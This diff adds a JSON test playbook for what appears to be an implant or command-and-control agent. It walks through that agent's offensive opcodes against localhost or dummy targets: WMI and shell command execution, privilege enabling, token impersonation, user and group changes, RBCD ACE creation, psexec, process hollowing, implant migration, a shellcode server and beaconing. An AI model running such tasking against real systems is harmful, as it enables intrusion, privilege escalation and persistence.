@@ -1,0 +1,350 @@
+{
+  "constants": [
+    "========== OPCODE TEST PLAYBOOK =========="
+  ],
+
+  "task_sets": {
+    "0": [
+      { "op": "redirect_stdout", "path": "opcode_test_results.txt" },
+      { "op": "get_const", "index": 0 },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x0A] set_var" },
+      { "op": "print_var", "var": 10 },
+
+      { "op": "set_var", "var": 10, "data": "[0x01] store_result + [0x08] check_error" },
+      { "op": "print_var", "var": 10 },
+      { "op": "run_command", "command": "echo test" },
+      { "op": "store_result", "var": 0 },
+      { "op": "check_error", "var": 0 },
+      { "op": "print_var", "var": 0 },
+
+      { "op": "set_var", "var": 10, "data": "[0x0F] get_const" },
+      { "op": "print_var", "var": 10 },
+      { "op": "get_const", "index": 0 },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x03] sleep" },
+      { "op": "print_var", "var": 10 },
+      { "op": "sleep", "ms": 100 },
+
+      { "op": "set_var", "var": 10, "data": "[0x0C] goto" },
+      { "op": "print_var", "var": 10 },
+      { "op": "goto", "target": 22 },
+      { "op": "set_var", "var": 10, "data": "ERROR: goto failed!" },
+      { "op": "set_var", "var": 10, "data": "goto OK" },
+      { "op": "print_var", "var": 10 },
+
+      { "op": "set_var", "var": 10, "data": "[0x09] conditional (data check)" },
+      { "op": "print_var", "var": 10 },
+      { "op": "set_var", "var": 11, "data": "test_data" },
+      { "op": "conditional", "mode": "data", "var1": 11, "true": 28, "false": 30 },
+      { "op": "set_var", "var": 10, "data": "conditional data TRUE OK" },
+      { "op": "goto", "target": 31 },
+      { "op": "set_var", "var": 10, "data": "ERROR: conditional data FALSE" },
+      { "op": "print_var", "var": 10 },
+
+      { "op": "set_var", "var": 10, "data": "[0x09] conditional (error check)" },
+      { "op": "print_var", "var": 10 },
+      { "op": "conditional", "mode": "error", "var1": 11, "true": 35, "false": 37 },
+      { "op": "set_var", "var": 10, "data": "conditional error=0 TRUE OK" },
+      { "op": "goto", "target": 38 },
+      { "op": "set_var", "var": 10, "data": "ERROR: conditional error!=0" },
+      { "op": "print_var", "var": 10 },
+
+      { "op": "set_var", "var": 10, "data": "[0x13] redirect_stdout (tested at idx 0)" },
+      { "op": "print_var", "var": 10 },
+
+      { "op": "set_var", "var": 10, "data": "[0x05] get_cwd" },
+      { "op": "print_var", "var": 10 },
+      { "op": "get_cwd" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x07] write_file" },
+      { "op": "print_var", "var": 10 },
+      { "op": "write_file", "path": "opcode_test_temp.txt", "content": "write_file_test_data" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x06] read_file" },
+      { "op": "print_var", "var": 10 },
+      { "op": "read_file", "path": "opcode_test_temp.txt" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x2D] delete_file" },
+      { "op": "print_var", "var": 10 },
+      { "op": "delete_file", "path": "opcode_test_temp.txt" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x04] run_command" },
+      { "op": "print_var", "var": 10 },
+      { "op": "run_command", "command": "whoami" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x10] wmi_exec" },
+      { "op": "print_var", "var": 10 },
+      { "op": "wmi_exec", "command": "calc.exe" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x33] shell_execute" },
+      { "op": "print_var", "var": 10 },
+      { "op": "shell_execute", "path": "cmd.exe", "verb": "open", "args": "/c echo 1" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x34] shell_extract (expect error)" },
+      { "op": "print_var", "var": 10 },
+      { "op": "shell_extract", "path": "C:\\nonexistent_opcode_test.zip" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x35] shell_execute_explorer" },
+      { "op": "print_var", "var": 10 },
+      { "op": "shell_execute_explorer", "path": "cmd.exe", "verb": "open", "args": "/c echo 1" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x0E] list_procs" },
+      { "op": "print_var", "var": 10 },
+      { "op": "list_procs" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x15] resolve_hostname" },
+      { "op": "print_var", "var": 10 },
+      { "op": "resolve_hostname", "hostname": "localhost" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x11] http_send" },
+      { "op": "print_var", "var": 10 },
+      { "op": "http_send", "method": "GET", "host": "127.0.0.1", "port": 80, "path": "/", "secure": false, "body": "" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x1C] portscan" },
+      { "op": "print_var", "var": 10 },
+      { "op": "portscan", "targets": "127.0.0.1", "ports": "445" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x24] reg_create_key" },
+      { "op": "print_var", "var": 10 },
+      { "op": "reg_create_key", "key": "HKCU\\SOFTWARE\\OpcodeTest" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x26] reg_set_value" },
+      { "op": "print_var", "var": 10 },
+      { "op": "reg_set_value", "key": "HKCU\\SOFTWARE\\OpcodeTest", "value_name": "TestVal", "value_type": "REG_SZ", "value": "TestData123" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x27] reg_query_value" },
+      { "op": "print_var", "var": 10 },
+      { "op": "reg_query_value", "key": "HKCU\\SOFTWARE\\OpcodeTest", "value_name": "TestVal" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x25] reg_delete_key" },
+      { "op": "print_var", "var": 10 },
+      { "op": "reg_delete_key", "key": "HKCU\\SOFTWARE\\OpcodeTest" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x2C] list_thread_privs" },
+      { "op": "print_var", "var": 10 },
+      { "op": "list_thread_privs" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x2B] list_process_privs" },
+      { "op": "print_var", "var": 10 },
+      { "op": "list_process_privs", "search": "" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x2A] enable_privilege" },
+      { "op": "print_var", "var": 10 },
+      { "op": "enable_privilege", "search": "", "priv_name": "SeDebugPrivilege" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x28] make_token (expect error)" },
+      { "op": "print_var", "var": 10 },
+      { "op": "make_token", "domain": ".", "username": "fakeuser_optest", "password": "FakeP@ss1" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x29] impersonate_process (expect error)" },
+      { "op": "print_var", "var": 10 },
+      { "op": "impersonate_process", "search": "nonexistent_proc_optest" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x2E] revert_to_self" },
+      { "op": "print_var", "var": 10 },
+      { "op": "revert_to_self" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x20] get_user_sid" },
+      { "op": "print_var", "var": 10 },
+      { "op": "get_user_sid", "server": "", "username": "Administrator" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x1D] set_user_password (expect error)" },
+      { "op": "print_var", "var": 10 },
+      { "op": "set_user_password", "server": "", "username": "nonexistent_optest", "password": "P@ss123!" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x1E] add_user_to_localgroup (expect error)" },
+      { "op": "print_var", "var": 10 },
+      { "op": "add_user_to_localgroup", "server": "", "group": "Users", "username": "nonexistent_optest" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x1F] remove_user_from_localgroup (expect error)" },
+      { "op": "print_var", "var": 10 },
+      { "op": "remove_user_from_localgroup", "server": "", "group": "Users", "username": "nonexistent_optest" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x21] add_user_to_group (expect error)" },
+      { "op": "print_var", "var": 10 },
+      { "op": "add_user_to_group", "server": "", "group": "Users", "username": "nonexistent_optest" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x22] remove_user_from_group (expect error)" },
+      { "op": "print_var", "var": 10 },
+      { "op": "remove_user_from_group", "server": "", "group": "Users", "username": "nonexistent_optest" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x19] query_ldap (expect error)" },
+      { "op": "print_var", "var": 10 },
+      { "op": "query_ldap", "base": "DC=test,DC=local", "filter": "(objectClass=user)", "scope": 2, "attribute": "cn" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x1A] set_ad_attr_str (expect error)" },
+      { "op": "print_var", "var": 10 },
+      { "op": "set_ad_attr_str", "dn": "CN=test,DC=test,DC=local", "attr": "description", "value": "test" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x1B] set_ad_attr_bin (expect error)" },
+      { "op": "print_var", "var": 10 },
+      { "op": "set_ad_attr_bin", "dn": "CN=test,DC=test,DC=local", "attr": "userCertificate", "value": {"hex": "DEADBEEF"} },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x23] create_rbcd_ace" },
+      { "op": "print_var", "var": 10 },
+      { "op": "create_rbcd_ace", "sid": "S-1-5-21-1234567890-1234567890-1234567890-1001" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x2F] start_service (expect error)" },
+      { "op": "print_var", "var": 10 },
+      { "op": "start_service", "target": "", "service_name": "nonexistent_svc_optest" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x30] delete_service (expect error)" },
+      { "op": "print_var", "var": 10 },
+      { "op": "delete_service", "target": "", "service_name": "nonexistent_svc_optest" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x3A] register_service (expect error)" },
+      { "op": "print_var", "var": 10 },
+      { "op": "register_service", "name": "OpcodeTestSvc" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x44] mem_read (KUSER_SHARED_DATA)" },
+      { "op": "print_var", "var": 10 },
+      { "op": "mem_read", "address": "0x7FFE0000", "size": 16 },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x45] dll_list" },
+      { "op": "print_var", "var": 10 },
+      { "op": "dll_list" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x46] mem_map" },
+      { "op": "print_var", "var": 10 },
+      { "op": "mem_map" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x47] malfind" },
+      { "op": "print_var", "var": 10 },
+      { "op": "malfind" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x48] ldr_check" },
+      { "op": "print_var", "var": 10 },
+      { "op": "ldr_check" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x36] load_library" },
+      { "op": "print_var", "var": 10 },
+      { "op": "load_library", "path": "../staging/python38.dll" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x12] sacrificial" },
+      { "op": "print_var", "var": 10 },
+      { "op": "sacrificial", "image": "C:\\Windows\\System32\\notepad.exe", "task_id": 1 },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x38] hollow" },
+      { "op": "print_var", "var": 10 },
+      { "op": "hollow", "image": "C:\\Windows\\System32\\notepad.exe", "task_id": 1 },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x3C] hollow_apc" },
+      { "op": "print_var", "var": 10 },
+      { "op": "hollow_apc", "image": "C:\\Windows\\System32\\notepad.exe", "task_id": 1 },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x31] create_thread" },
+      { "op": "print_var", "var": 10 },
+      { "op": "create_thread", "task": 1 },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x0D] migrate (expect error: process not found)" },
+      { "op": "print_var", "var": 10 },
+      { "op": "migrate", "search": "nonexistent_proc_optest.exe" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x39] migrate_apc: see task set 7 (spawns image, migrates implant)" },
+      { "op": "print_var", "var": 10 },
+
+      { "op": "set_var", "var": 10, "data": "[0x02] get_shellcode (expect error: no server)" },
+      { "op": "print_var", "var": 10 },
+      { "op": "get_shellcode", "task": 0 },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "[0x16] psexec (expect error: no target)" },
+      { "op": "print_var", "var": 10 },
+      { "op": "psexec", "target": "127.0.0.1", "service_name": "optest_svc", "display_name": "Opcode Test Service", "binary_path": "C:\\optest.exe", "service_bin": "" },
+      { "op": "print_var" },
+
+      { "op": "set_var", "var": 10, "data": "========== ALL TESTS COMPLETE ==========" },
+      { "op": "print_var", "var": 10 }
+    ],
+
+    "1": [
+      { "op": "sleep", "ms": 100 }
+    ],
+
+    "2": [
+      { "op": "set_var", "var": 10, "data": "[0x14] shellcode_server (BLOCKS)" },
+      { "op": "print_var", "var": 10 },
+      { "op": "shellcode_server", "port": 18080, "magic_base": "0x1000" }
+    ],
+
+    "3": [
+      { "op": "set_var", "var": 10, "data": "[0x43] http_beacon (BLOCKS)" },
+      { "op": "print_var", "var": 10 },
+      { "op": "http_beacon", "host": "127.0.0.1", "port": 1, "interval": 5000 }
+    ],
+
+    "4": [
+      { "op": "set_var", "var": 10, "data": "[0x42] kill" },
+      { "op": "print_var", "var": 10 },
+      { "op": "kill" }
+    ],
+
+    "5": [
+      { "op": "set_var", "var": 10, "data": "[0x3B] exit_process" },
+      { "op": "print_var", "var": 10 },
+      { "op": "exit_process", "code": 0 }
+    ],
+
+    "6": [
+      { "op": "set_var", "var": 0, "data": "it works" },
+      { "op": "print_var", "var": 0 }
+    ],
+
+    "7": [
+      { "op": "set_var", "var": 10, "data": "[0x39] migrate_apc (spawns image, implant migrates — run manually)" },
+      { "op": "print_var", "var": 10 },
+      { "op": "migrate_apc", "image": "C:\\Windows\\System32\\notepad.exe", "task_id": 1 },
+      { "op": "print_var" }
+    ]
+  }
+}
